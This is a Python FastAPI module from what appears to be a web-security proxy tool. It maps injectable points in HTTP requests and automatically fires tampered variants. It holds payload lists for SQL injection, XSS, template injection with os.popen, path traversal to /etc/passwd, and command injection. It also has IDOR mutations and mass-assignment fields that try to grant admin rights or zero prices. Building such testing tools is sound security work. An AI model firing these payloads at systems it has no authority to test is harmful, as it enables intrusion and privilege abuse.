from __future__ import annotations

import json
import re
import time
import urllib.parse

import httpx
from fastapi import Depends,  APIRouter, HTTPException

from api.auth import get_current_user, AUTH_DISABLED

from state.shared import ProxyState

router = APIRouter(prefix="/api/tamper", tags=["tamper"],
    dependencies=[Depends(get_current_user)] if not AUTH_DISABLED else []
)
state = ProxyState()

# ── Shared request helper ─────────────────────────────────

async def _fire(method: str, url: str, headers: dict, body: str, timeout: int = 10) -> dict:
    """Send request and return result (without storing as flow)."""
    send_headers = {k: v for k, v in (headers or {}).items() if k.lower() != "content-length"}
    start = time.time()
    try:
        async with httpx.AsyncClient(verify=False, timeout=timeout, follow_redirects=True) as client:
            resp = await client.request(
                method=method, url=url,
                headers=send_headers or None,
                content=body.encode("utf-8") if body else None,
            )
        duration = round((time.time() - start) * 1000, 1)
        return {
            "status_code": resp.status_code,
            "duration_ms": duration,
            "size": len(resp.content),
            "body": resp.text[:10_000] if resp.text else "",
            "headers": dict(resp.headers),
        }
    except Exception as e:
        return {
            "status_code": 0,
            "duration_ms": round((time.time() - start) * 1000, 1),
            "size": 0,
            "error": str(e),
        }


# ── Injection Point Mapper ────────────────────────────────

@router.post("/injection-points")
def map_injection_points(data: dict):
    """Identify all injectable points in a request."""
    flow_id = data.get("flow_id", "")
    if flow_id:
        flow = state.get_flow(flow_id)
        if not flow:
            raise HTTPException(404, "Flow not found")
        method = flow.method
        url = flow.url
        headers = flow.request_headers or {}
        body = flow.request_body or ""
    else:
        method = data.get("method", "GET")
        url = data.get("url", "")
        headers = data.get("headers", {})
        body = data.get("body", "")

    points = []

    # URL path segments
    parsed = urllib.parse.urlparse(url)
    path_parts = parsed.path.strip("/").split("/")
    for i, part in enumerate(path_parts):
        if part:
            points.append({
                "type": "path",
                "name": f"path[{i}]",
                "value": part,
                "location": f"URL path segment {i}",
            })

    # Query parameters
    if parsed.query:
        for key, values in urllib.parse.parse_qs(parsed.query, keep_blank_values=True).items():
            for v in values:
                points.append({
                    "type": "query",
                    "name": key,
                    "value": v,
                    "location": f"Query parameter",
                })

    # Headers (skip standard non-injectable ones)
    skip_headers = {"host", "accept-encoding", "connection", "content-length", "content-type"}
    for k, v in headers.items():
        if k.lower() not in skip_headers:
            points.append({
                "type": "header",
                "name": k,
                "value": v,
                "location": "Request header",
            })

    # Cookie values
    cookie_header = headers.get("Cookie") or headers.get("cookie") or ""
    if cookie_header:
        for cookie in cookie_header.split(";"):
            cookie = cookie.strip()
            if "=" in cookie:
                name, val = cookie.split("=", 1)
                points.append({
                    "type": "cookie",
                    "name": name.strip(),
                    "value": val.strip(),
                    "location": "Cookie",
                })

    # Body parameters
    ct = headers.get("Content-Type") or headers.get("content-type") or ""
    if body:
        if "application/json" in ct:
            try:
                obj = json.loads(body)
                _extract_json_points(points, obj, "")
            except json.JSONDecodeError:
                points.append({
                    "type": "body_raw",
                    "name": "body",
                    "value": body[:200],
                    "location": "Request body (raw)",
                })
        elif "application/x-www-form-urlencoded" in ct:
            for key, values in urllib.parse.parse_qs(body, keep_blank_values=True).items():
                for v in values:
                    points.append({
                        "type": "form",
                        "name": key,
                        "value": v,
                        "location": "Form parameter",
                    })
        else:
            points.append({
                "type": "body_raw",
                "name": "body",
                "value": body[:200],
                "location": "Request body (raw)",
            })

    return {
        "points": points,
        "count": len(points),
        "request": {"method": method, "url": url},
    }


def _extract_json_points(points: list, obj, prefix: str):
    if isinstance(obj, dict):
        for k, v in obj.items():
            path = f"{prefix}.{k}" if prefix else k
            if isinstance(v, (dict, list)):
                _extract_json_points(points, v, path)
            else:
                points.append({
                    "type": "json",
                    "name": path,
                    "value": str(v) if v is not None else "null",
                    "location": f"JSON field",
                })
    elif isinstance(obj, list):
        for i, item in enumerate(obj[:10]):  # limit array items
            _extract_json_points(points, item, f"{prefix}[{i}]")


# ── Auto Parameter Tamper ──────────────────────────────────

TAMPER_STRATEGIES = {
    "idor": {
        "desc": "IDOR - Increment/decrement IDs",
        "generator": lambda val: _idor_variants(val),
    },
    "type_juggle": {
        "desc": "Type juggling - Change types",
        "generator": lambda val: [
            "0", "1", "-1", "true", "false", "null", "[]", "{}",
            '""', "undefined", "NaN", "Infinity",
        ],
    },
    "boundary": {
        "desc": "Boundary values",
        "generator": lambda val: [
            "", " ", "0", "-1", "2147483647", "-2147483648",
            "9999999999999", "0.1", "-0.1", "99999999999999999999",
            "a" * 1000, "\x00", "\n", "\r\n",
        ],
    },
    "sqli": {
        "desc": "SQL Injection probes",
        "generator": lambda val: [
            f"{val}'", f"{val}\"", f"{val}' OR '1'='1",
            f"{val}' OR 1=1--", f"{val}' AND 1=2--",
            f"{val}; SELECT 1--", f"{val}' UNION SELECT NULL--",
            f"{val}' WAITFOR DELAY '0:0:5'--",
            f"{val}') OR ('1'='1",
        ],
    },
    "xss": {
        "desc": "XSS probes",
        "generator": lambda val: [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "javascript:alert(1)",
            "'-alert(1)-'",
            '<svg/onload=alert(1)>',
            '{{7*7}}',
            '${7*7}',
            '<%=7*7%>',
        ],
    },
    "path_traversal": {
        "desc": "Path traversal",
        "generator": lambda val: [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "file:///etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ],
    },
    "cmd_inject": {
        "desc": "Command injection",
        "generator": lambda val: [
            f"{val};id", f"{val}|id", f"{val}`id`",
            f"{val}$(id)", f"{val}%0aid", f"{val}\nid",
            f"{val};sleep 5", f"{val}|sleep 5",
        ],
    },
    "ssti": {
        "desc": "Server-Side Template Injection",
        "generator": lambda val: [
            "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}",
            "${7*'7'}", "{{constructor.constructor('return 1')()}}",
            "{%%20import%20os%20%%}{{os.popen('id').read()}}",
            "{{config}}", "{{self.__class__.__mro__}}",
        ],
    },
}


def _idor_variants(val: str) -> list:
    try:
        n = int(val)
        return [str(n-1), str(n+1), str(n-10), str(n+10), "0", "1", str(n*2)]
    except ValueError:
        return [val + "1", "admin", "test", "0", "1"]


@router.post("/auto")
async def auto_tamper(data: dict):
    """Auto-generate and fire tampered request variants."""
    flow_id = data.get("flow_id", "")
    strategies = data.get("strategies", ["idor", "type_juggle", "boundary"])
    target_points = data.get("target_points", [])  # specific injection point names
    fire = data.get("fire", False)  # actually send requests
    max_requests = min(data.get("max_requests", 50), 200)

    if flow_id:
        flow = state.get_flow(flow_id)
        if not flow:
            raise HTTPException(404, "Flow not found")
        method = flow.method
        url = flow.url
        headers = flow.request_headers or {}
        body = flow.request_body or ""
    else:
        method = data.get("method", "GET")
        url = data.get("url", "")
        headers = data.get("headers", {})
        body = data.get("body", "")

    # Get injection points
    points_resp = map_injection_points({
        "method": method, "url": url, "headers": headers, "body": body,
    })
    all_points = points_resp["points"]

    if target_points:
        all_points = [p for p in all_points if p["name"] in target_points]

    variants = []
    for point in all_points:
        for strat_name in strategies:
            strat = TAMPER_STRATEGIES.get(strat_name)
            if not strat:
                continue
            payloads = strat["generator"](point["value"])
            for payload in payloads:
                if len(variants) >= max_requests:
                    break
                variant = _build_variant(method, url, headers, body, point, payload)
                variant["strategy"] = strat_name
                variant["strategy_desc"] = strat["desc"]
                variant["point_name"] = point["name"]
                variant["point_type"] = point["type"]
                variant["original_value"] = point["value"]
                variant["payload"] = payload
                variants.append(variant)
            if len(variants) >= max_requests:
                break
        if len(variants) >= max_requests:
            break

    results = []
    if fire:
        for v in variants:
            resp = await _fire(v["method"], v["url"], v["headers"], v.get("body", ""))
            results.append({
                **{k: v2 for k, v2 in v.items() if k not in ("headers",)},
                "response_status": resp["status_code"],
                "response_size": resp.get("size", 0),
                "response_duration": resp.get("duration_ms", 0),
                "response_body_preview": resp.get("body", "")[:500],
                "error": resp.get("error"),
            })
    else:
        results = variants

    return {"results": results, "total": len(results), "fired": fire}


def _build_variant(method, url, headers, body, point, payload):
    """Build a tampered request variant by substituting payload at injection point."""
    new_url = url
    new_headers = dict(headers)
    new_body = body

    if point["type"] == "path":
        parsed = urllib.parse.urlparse(url)
        parts = parsed.path.strip("/").split("/")
        m = re.search(r'\d+', point["name"])
        idx = int(m.group()) if m else 0
        if idx < len(parts):
            parts[idx] = urllib.parse.quote(payload, safe="")
        new_path = "/" + "/".join(parts)
        new_url = parsed._replace(path=new_path).geturl()

    elif point["type"] == "query":
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[point["name"]] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        new_url = parsed._replace(query=new_query).geturl()

    elif point["type"] == "header":
        new_headers[point["name"]] = payload

    elif point["type"] == "cookie":
        cookie = new_headers.get("Cookie") or new_headers.get("cookie") or ""
        # Replace the specific cookie value
        cookie = re.sub(
            re.escape(point["name"]) + r'=[^;]*',
            f'{point["name"]}={payload}',
            cookie,
        )
        new_headers["Cookie"] = cookie

    elif point["type"] == "json":
        try:
            obj = json.loads(body)
            _set_json_value(obj, point["name"], payload)
            new_body = json.dumps(obj)
        except (json.JSONDecodeError, Exception):
            new_body = body.replace(str(point["value"]), payload, 1)

    elif point["type"] == "form":
        params = urllib.parse.parse_qs(body, keep_blank_values=True)
        params[point["name"]] = [payload]
        new_body = urllib.parse.urlencode(params, doseq=True)

    else:
        new_body = body.replace(str(point["value"]), payload, 1) if body else body

    return {"method": method, "url": new_url, "headers": new_headers, "body": new_body}


def _set_json_value(obj, path: str, value: str):
    """Set a value in a nested JSON object using dot notation."""
    keys = re.split(r'\.|\[(\d+)\]', path)
    keys = [k for k in keys if k is not None and k != ""]
    current = obj
    for key in keys[:-1]:
        if key.isdigit():
            current = current[int(key)]
        else:
            current = current[key]
    last = keys[-1]
    # Try to preserve type
    if last.isdigit():
        current[int(last)] = _coerce_value(value)
    else:
        current[last] = _coerce_value(value)


def _coerce_value(val: str):
    """Try to parse value as JSON type, fallback to string."""
    if val == "null":
        return None
    if val == "true":
        return True
    if val == "false":
        return False
    if val == "[]":
        return []
    if val == "{}":
        return {}
    try:
        return int(val)
    except ValueError:
        pass
    try:
        return float(val)
    except ValueError:
        pass
    return val


# ── Payload Swapper ────────────────────────────────────────

PAYLOAD_LISTS = {
    "sqli": TAMPER_STRATEGIES["sqli"]["generator"](""),
    "xss": TAMPER_STRATEGIES["xss"]["generator"](""),
    "ssti": TAMPER_STRATEGIES["ssti"]["generator"](""),
    "path_traversal": TAMPER_STRATEGIES["path_traversal"]["generator"](""),
    "cmd_inject": TAMPER_STRATEGIES["cmd_inject"]["generator"](""),
}


@router.post("/payloads")
async def swap_payloads(data: dict):
    """Fire a payload list at a specific injection point."""
    flow_id = data.get("flow_id", "")
    point_name = data.get("point_name", "")
    payload_type = data.get("payload_type", "xss")
    custom_payloads = data.get("custom_payloads", [])

    if not point_name:
        raise HTTPException(400, "point_name is required")

    if flow_id:
        flow = state.get_flow(flow_id)
        if not flow:
            raise HTTPException(404, "Flow not found")
        method = flow.method
        url = flow.url
        headers = flow.request_headers or {}
        body = flow.request_body or ""
    else:
        method = data.get("method", "GET")
        url = data.get("url", "")
        headers = data.get("headers", {})
        body = data.get("body", "")

    # Get the target point
    points_resp = map_injection_points({
        "method": method, "url": url, "headers": headers, "body": body,
    })
    target = None
    for p in points_resp["points"]:
        if p["name"] == point_name:
            target = p
            break
    if not target:
        raise HTTPException(400, f"Injection point '{point_name}' not found")

    payloads = custom_payloads or PAYLOAD_LISTS.get(payload_type, [])
    # Get baseline
    baseline = await _fire(method, url, headers, body)

    results = []
    for payload in payloads[:100]:
        variant = _build_variant(method, url, headers, body, target, payload)
        resp = await _fire(variant["method"], variant["url"], variant["headers"], variant.get("body", ""))

        # Flag anomalies
        anomalies = []
        if resp.get("status_code") != baseline.get("status_code"):
            anomalies.append(f"Status changed: {baseline.get('status_code')} → {resp.get('status_code')}")
        if abs(resp.get("size", 0) - baseline.get("size", 0)) > 100:
            anomalies.append(f"Size diff: {resp.get('size', 0) - baseline.get('size', 0):+d} bytes")
        if resp.get("duration_ms", 0) > baseline.get("duration_ms", 0) * 3 and resp.get("duration_ms", 0) > 1000:
            anomalies.append(f"Slow response: {resp.get('duration_ms')}ms (baseline: {baseline.get('duration_ms')}ms)")
        # Check for payload reflection
        resp_body = resp.get("body", "")
        if payload in resp_body:
            anomalies.append("Payload reflected in response")

        results.append({
            "payload": payload,
            "status_code": resp.get("status_code"),
            "size": resp.get("size", 0),
            "duration_ms": resp.get("duration_ms", 0),
            "anomalies": anomalies,
            "interesting": len(anomalies) > 0,
            "error": resp.get("error"),
        })

    interesting = [r for r in results if r["interesting"]]
    return {
        "results": results,
        "baseline": {
            "status_code": baseline.get("status_code"),
            "size": baseline.get("size", 0),
            "duration_ms": baseline.get("duration_ms", 0),
        },
        "interesting": interesting,
        "total": len(results),
        "found": len(interesting),
    }


# ── Mass Assignment Tester ─────────────────────────────────

MASS_ASSIGN_FIELDS = [
    ("is_admin", True), ("isAdmin", True), ("admin", True),
    ("role", "admin"), ("roles", ["admin"]),
    ("user_type", "admin"), ("userType", "administrator"),
    ("verified", True), ("is_verified", True), ("email_verified", True),
    ("active", True), ("is_active", True), ("enabled", True),
    ("approved", True), ("is_approved", True),
    ("banned", False), ("is_banned", False),
    ("premium", True), ("is_premium", True),
    ("price", 0), ("amount", 0), ("total", 0),
    ("discount", 100), ("discount_percent", 100),
    ("quantity", 999999),
    ("balance", 999999),
    ("credits", 999999),
    ("permissions", ["*"]),
    ("scope", "admin"), ("scopes", ["read", "write", "admin"]),
    ("user_id", 1), ("userId", 1), ("owner_id", 1),
    ("account_id", 1), ("org_id", 1),
    ("created_at", "2020-01-01"), ("updated_at", "2099-01-01"),
    ("deleted", False), ("is_deleted", False),
    ("password_reset", True),
    ("two_factor_enabled", False), ("mfa_enabled", False),
    ("api_key", "test_key_override"),
]


@router.post("/mass-assign")
async def test_mass_assignment(data: dict):
    """Test for mass assignment by adding hidden fields to request body."""
    flow_id = data.get("flow_id", "")
    custom_fields = data.get("custom_fields", {})

    if flow_id:
        flow = state.get_flow(flow_id)
        if not flow:
            raise HTTPException(404, "Flow not found")
        method = flow.method
        url = flow.url
        headers = flow.request_headers or {}
        body = flow.request_body or ""
    else:
        method = data.get("method", "POST")
        url = data.get("url", "")
        headers = data.get("headers", {})
        body = data.get("body", "")

    ct = headers.get("Content-Type") or headers.get("content-type") or ""

    # Get baseline
    baseline = await _fire(method, url, headers, body)

    results = []

    if "application/json" in ct:
        try:
            original = json.loads(body) if body else {}
        except json.JSONDecodeError:
            original = {}

        # Test each field individually
        test_fields = list(custom_fields.items()) if custom_fields else MASS_ASSIGN_FIELDS
        for field_name, field_value in test_fields:
            if field_name in original:
                continue  # Skip existing fields
            tampered = dict(original)
            tampered[field_name] = field_value
            tampered_body = json.dumps(tampered)

            resp = await _fire(method, url, headers, tampered_body)

            # Compare to baseline
            anomalies = []
            if resp.get("status_code") != baseline.get("status_code"):
                anomalies.append(f"Status: {baseline.get('status_code')} → {resp.get('status_code')}")
            if resp.get("status_code") and resp["status_code"] < 400:
                anomalies.append("Field accepted (2xx/3xx response)")
            size_diff = abs(resp.get("size", 0) - baseline.get("size", 0))
            if size_diff > 50:
                anomalies.append(f"Response size changed by {size_diff} bytes")
            # Check if field appears in response
            resp_body = resp.get("body", "")
            if str(field_name) in resp_body:
                anomalies.append("Field name reflected in response")

            results.append({
                "field": field_name,
                "value": field_value,
                "status_code": resp.get("status_code"),
                "size": resp.get("size", 0),
                "anomalies": anomalies,
                "interesting": len(anomalies) > 1,  # need more than just "accepted"
                "error": resp.get("error"),
            })
    else:
        return {"error": "Mass assignment testing requires JSON Content-Type", "results": []}

    interesting = [r for r in results if r["interesting"]]
    return {
        "results": results,
        "baseline": {
            "status_code": baseline.get("status_code"),
            "size": baseline.get("size", 0),
        },
        "interesting": interesting,
        "total": len(results),
        "found": len(interesting),
    }